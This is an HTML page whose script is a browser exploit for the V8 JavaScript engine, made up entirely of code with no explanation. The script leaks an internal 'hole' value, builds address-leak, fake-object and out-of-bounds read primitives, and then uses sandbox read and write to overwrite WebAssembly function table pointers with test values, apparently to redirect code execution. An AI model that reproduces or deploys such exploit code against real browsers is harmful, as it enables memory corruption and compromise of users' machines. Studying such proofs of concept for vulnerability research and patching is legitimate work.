<pre id="log"></pre>

<script>
function print(_log) {
  console.log(`${_log}`)
  document.getElementById("log").innerHTML += `${_log}<br/>`
}

var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var uint32 = new Uint32Array(buf);

function f2i(f) {
  float64[0] = f;
  return bigUint64[0];
}

function i2f(i) {
  bigUint64[0] = i;
  return float64[0];
}

function i322f(l, u) {
  uint32[0] = Number(l);
  uint32[1] = Number(u);
  return float64[0];
}

Number.prototype.toBigInt = function toBigInt() {
  float64[0] = this;
  return bigUint64[0];
};

BigInt.prototype.toNumber = function toNumber() {
  bigUint64[0] = this;
  return float64[0];
};

function hex(i) {
  return i.toString(16).padStart(16, "0");
}

// =================== //
//     Start here!     //
// =================== //

var h0le = [0];
function leak_hole() {
  function rGlobal() {
      h0le[0] = stack;
  }
  Error.captureStackTrace(globalThis);
  Error.prepareStackTrace = function() {
    Reflect.deleteProperty(Error, 'prepareStackTrace');
    Reflect.deleteProperty(globalThis, 'stack');
    Reflect.defineProperty(
      globalThis, 
      'stack',
      {configurable: false, writable: true, enumerable: true, value: 1}
	  );
    stack = undefined;
    for (let i = 0; i < 100000; i++) {
      rGlobal();
    }
    return undefined;
  };
  Reflect.defineProperty(
	  globalThis, 
	  'stack',
	  {configurable: true, writable: true, enumerable: true, value: undefined}
  );
  delete globalThis.stack;
  rGlobal();
  return h0le[0];
}

const the = {  hole: leak_hole()  };
let f_arr;  
let o_arr;
let oobReadValue;
let oobAddrOfValue;
let oobFakeObjValue;

function addrOf(bool, _inner_object) {
  let hole = the.hole;
  let idx = (Number(bool ? hole : -1) | 0) + 1;
  f_arr = [1.1];
  o_arr = [_inner_object];
  oobAddrOfValue = f2i(f_arr.at(idx * 4));
  return oobAddrOfValue & 0xffffffffn
}
for (var i = 0; i < 0x10000; i++) {
  addrOf(true, {}); // put some dummy shit
}

function fakeObj(bool, _inner_float) {
  let hole = the.hole;
  let idx = (Number(bool ? hole : -1) | 0) + 1;
  o_arr = [{}];
  f_arr = [_inner_float];
  oobFakeObjValue = o_arr.at(idx * 7);
  return oobFakeObjValue
}
for (var i = 0; i < 0x10000; i++) {
  fakeObj(true, 1.1); // put some dummy shit
}

function relativeRead(bool) {
  let hole = the.hole;
  let idx = (Number(bool ? hole : -1) | 0) + 1;
  f_arr = [1.1];
  o_arr = [{}];
  oobReadValue = f2i(f_arr.at(idx * 1));
  return oobReadValue
}
for (var i = 0; i < 0x10000; i++) {
  relativeRead(true)
}

function sandboxRead(_address) {
  let readArray = [1.1, 2.2];
  readArray[0] = i2f(oobReadValue);
  readArray[1] = i322f(_address - 8n, 0x10);
  let readArrayAddress = addrOf(true, readArray);
  let fakeObject = fakeObj(true, i322f(readArrayAddress - 0x10n, readArrayAddress - 0x10n));
  return f2i(fakeObject[0]);
}

function sandboxWrite(_address, _value) {
  let readArray = [1.1, 2.2];
  readArray[0] = i2f(oobReadValue);
  readArray[1] = i322f(_address - 8n, 0x10);
  let readArrayAddress = addrOf(true, readArray);
  let fakeObject = fakeObj(true, i322f(readArrayAddress - 0x10n, readArrayAddress - 0x10n));
  fakeObject[0] = i2f(_value)
}

const tbl0Table = new WebAssembly.Table({
    initial: 5,
    element: "anyfunc"
});

const importObject = {
    env: {
        jstimes3: (n) => 3 * n,
    },
    env0: {
        jstimes4: (n) => 3 * n,
    },
    env1: {
        jstimes5: (n) => 3 * n,
    },
    env2: {
        jstimes6: (n) => 3 * n,
    }, 
    js0: { tbl0: tbl0Table },
};

var code = new Uint8Array([0,97,115,109,1,0,0,0,1,10,2,96,1,127,1,127,96,0,1,127,2,77,5,3,101,110,118,8,106,115,116,105,109,101,115,51,0,0,4,101,110,118,48,8,106,115,116,105,109,101,115,52,0,0,4,101,110,118,49,8,106,115,116,105,109,101,115,53,0,0,4,101,110,118,50,8,106,115,116,105,109,101,115,54,0,0,3,106,115,48,4,116,98,108,48,1,112,0,3,3,7,6,1,1,1,1,0,0,7,16,2,6,116,105,109,101,115,50,0,8,3,112,119,110,0,9,9,10,1,0,65,0,11,4,4,5,6,7,10,33,6,4,0,65,1,11,4,0,65,2,11,4,0,65,3,11,4,0,65,4,11,4,0,65,16,11,6,0,65,16,16,0,11,11,19,1,1,16,202,254,202,254,202,254,202,254,222,173,190,239,222,173,190,239])
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module, importObject);

const OFFSET_wasm_instance_to_indirect_function_table_lower_32 = 0xccn
const OFFSET_indirect_function_table_to_wasm_indirect_function_table_lower_32 = 0x8n
const OFFSET_wasm_indirect_function_table_to_targets_full_pointer = 0x10n

const OFFSET_exported_function_to_shared_info_lower_32 = 0xcn
const OFFSET_shared_info_to_data_lower_32 = 0x4n
const OFFSET_data_to_index_lower_32 = 0x14n

const OFFSET_what_index = 0x1n
const OFFSET_what = (OFFSET_what_index + 1n) * 0x8n
const OFFSET_wasm_instance_to_imported_function_targets = 0x18n

var instanceAddr = addrOf(true, instance)
print(`[+] WASM Instance: ${instanceAddr.toString(16)}`)
var indirectFunctionTableAddr = sandboxRead(instanceAddr+OFFSET_wasm_instance_to_indirect_function_table_lower_32)&0xffffffffn
print(`[+] Indirect Function Table: ${indirectFunctionTableAddr .toString(16)}`)
var wasmIndirectFunctionTableAddr = sandboxRead(indirectFunctionTableAddr+OFFSET_indirect_function_table_to_wasm_indirect_function_table_lower_32)&0xffffffffn
print(`[+] WASM Indirect Function Table: ${wasmIndirectFunctionTableAddr.toString(16)}`)
var wasmIndirectFunctionTableTargetAddr = sandboxRead(wasmIndirectFunctionTableAddr+OFFSET_wasm_indirect_function_table_to_targets_full_pointer)
print(`[+] WASM Indirect Function Table Targets: ${wasmIndirectFunctionTableTargetAddr.toString(16)}`)
sandboxWrite(
	wasmIndirectFunctionTableAddr+OFFSET_wasm_indirect_function_table_to_targets_full_pointer,
	0x414141414141414141n
)
//alert("HOOK")
//tbl0Table.set(0, instance.exports.pwn)

var pwnAddr = addrOf(true, instance.exports.pwn)
print(`[+] Pwn: ${pwnAddr.toString(16)}`)
var pwnSharedInfoAddr = sandboxRead(pwnAddr+OFFSET_exported_function_to_shared_info_lower_32) & 0xffffffffn
print(`[+] Pwn Shared Info: ${pwnSharedInfoAddr.toString(16)}`)
var pwnSharedInfoDataAddr = sandboxRead(pwnSharedInfoAddr+OFFSET_shared_info_to_data_lower_32) & 0xffffffffn
print(`[+] Pwn Shared Info Data: ${pwnSharedInfoDataAddr.toString(16)}`)
var pwnIndex = sandboxRead(pwnSharedInfoDataAddr+OFFSET_data_to_index_lower_32)
print(`[+] Pwn Index (you should see 0x9 * 2 = 0x12): ${(pwnIndex & 0xffffffffn).toString(16)}`)
var newIndex = pwnIndex & 0xffffffff00000000n + OFFSET_what_index * 0x2n
sandboxWrite(pwnSharedInfoDataAddr+OFFSET_data_to_index_lower_32, newIndex)

var indirectFunctionTableAddr = sandboxRead(instanceAddr+OFFSET_wasm_instance_to_imported_function_targets)&0xffffffffn
print(`[+] WASM Instance Imported Function Tables: ${indirectFunctionTableAddr.toString(16)}`)
var indirectFunctionAddr = sandboxRead(indirectFunctionTableAddr+OFFSET_what)
print(`[+] Indirect Function: ${indirectFunctionAddr.toString(16)}`)
sandboxWrite(indirectFunctionTableAddr+OFFSET_what, 0x4242424242424242n)
alert("HOOK")
tbl0Table.set(0, instance.exports.pwn)


</script>